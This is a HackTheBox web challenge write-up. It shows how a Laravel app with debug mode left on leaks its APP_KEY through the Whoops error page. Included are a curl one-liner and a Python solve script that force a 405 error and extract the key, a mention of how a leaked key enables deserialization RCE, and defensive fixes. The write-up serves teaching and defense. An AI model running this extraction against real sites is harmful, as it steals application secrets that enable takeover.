---
title: "baby BoneChewerCon"
date: 2027-03-24 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, laravel, php, debug-mode, info-disclosure, app-key, whoops, cwe-215]
description: "An Easy Web challenge: a Laravel app ships to production with APP_DEBUG still on, so a single unhandled error renders the Whoops debug page — which dumps every environment variable, including the APP_KEY that happens to be the flag."
---

## Overview

`baby BoneChewerCon` is an Easy HackTheBox **Web** challenge. The site is a Laravel event-registration
page that "errors out" — and the prompt teases that *"the debugger is still enabled in production"* and
invites you to *"check out the secret key."* That is exactly the bug: with `APP_DEBUG=true`, any unhandled
exception renders Laravel's verbose **Whoops** error page, whose environment dump leaks every secret the
app holds. Here the `APP_KEY` is set to the flag, so the leak alone wins — no chaining required. This is a
classic [information exposure through debugging code](https://cwe.mitre.org/data/definitions/215.html)
([CWE-215](https://cwe.mitre.org/data/definitions/215.html)).

## The technique

The response headers identify the stack immediately:

```
X-Powered-By: PHP/7.4.12
Set-Cookie: laravel_session=...; httponly; samesite=lax
```

PHP + a `laravel_session` cookie = a Laravel app. The landing page is a registration form that POSTs a
`name` field back to `/`. But the `/` route is registered for **GET/HEAD only**, so submitting the form
raises `Symfony\Component\HttpKernel\Exception\MethodNotAllowedHttpException`. Because debug mode is on,
Laravel doesn't return a generic 500 — it renders the **Whoops** debug page, complete with a full stack
trace, source file paths (`/www/...`), and an **"Environment & details"** table that prints *every*
environment variable. Among them:

```
APP_KEY   "HTB{...}"
```

In a real engagement a leaked Laravel `APP_KEY` is high-value beyond the read itself — it lets you forge
the encrypted `X-XSRF-TOKEN`/session cookie into a PHP-object deserialization payload for remote code
execution ([CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)). This challenge
short-circuits that: the key *is* the flag.

## Solution

Triggering the error and reading the `APP_KEY` row takes a single request:

```bash
curl -s http://TARGET:PORT/ -X POST -d name=x | grep -aoE 'APP_KEY</td>.{0,200}sf-dump-str[^>]*>[^<]+'
```

The durable artifact, `solve.py`, POSTs to the GET-only route, catches the 405 body (which still carries
the Whoops page), and regex-extracts the `APP_KEY` environment value:

Create `solve.py`:

```python
#!/usr/bin/env python3
import sys, re, urllib.request

def main():
    target = sys.argv[1] if len(sys.argv) > 1 else "TARGET:PORT"
    url = f"http://{target}/"
    # POST to a GET-only route -> 405 -> Laravel debug page (debug enabled in prod)
    req = urllib.request.Request(url, data=b"name=x", method="POST")
    try:
        body = urllib.request.urlopen(req, timeout=15).read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:          # 405 still carries the debug page body
        body = e.read().decode("utf-8", "replace")
    # APP_KEY appears in the env table: <td>APP_KEY</td>...<span ...>VALUE</span>
    m = re.search(r"APP_KEY</td>.*?sf-dump-str[^>]*>([^<]+)</span>", body, re.S)
    appkey = m.group(1) if m else None
    flag = re.search(r"HTB\{[^}]*\}", appkey or body)
    print("[+] leaked APP_KEY:", appkey)
    print("[+] FLAG:", flag.group(0) if flag else "NOT FOUND")

if __name__ == "__main__":
    main()
```

Running it prints the leaked key:

```
[+] leaked APP_KEY: HTB{...}
[+] FLAG: HTB{...}
```

## Why it worked

Debug handlers like Whoops and Ignition are development-only diagnostics. Left enabled in production they
hand an attacker the application's framework version, source paths, stack traces, database credentials,
and — most damaging — the app's signing/encryption key. The challenge wires the `APP_KEY` to the flag, but
the underlying lesson is general: the debug page is an unauthenticated secret-dump reachable by anyone who
can make the app throw an exception, which is usually trivial.

## Fix / defense

- Set `APP_DEBUG=false` and `APP_ENV=production` in the production `.env`.
- Strip or disable Whoops/Ignition (and equivalent verbose error handlers — Symfony profiler, Flask
  `DEBUG=True`, Django `DEBUG=True`, ASP.NET `customErrors=Off`) from production builds.
- Return generic error pages to clients; log details server-side only.
- Rotate any `APP_KEY` or secret that was ever exposed through a debug page.
